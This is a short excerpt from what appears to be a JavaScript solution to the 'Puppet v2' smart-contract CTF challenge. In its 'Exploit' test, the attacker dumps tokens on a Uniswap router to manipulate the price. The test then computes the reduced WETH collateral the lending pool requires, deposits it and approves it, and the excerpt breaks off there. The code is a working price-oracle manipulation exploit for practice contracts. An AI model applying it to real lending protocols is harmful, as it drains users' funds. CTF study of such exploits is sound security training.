...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 0, [this.token.address, this.weth.address], attacker.address, 9999999999);

        const lendingCollateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);

        await this.weth.connect(attacker).deposit({value: lendingCollateral});
        await this.weth.connect(attacker).approve(this.lendingPool.address, lendingCollateral);
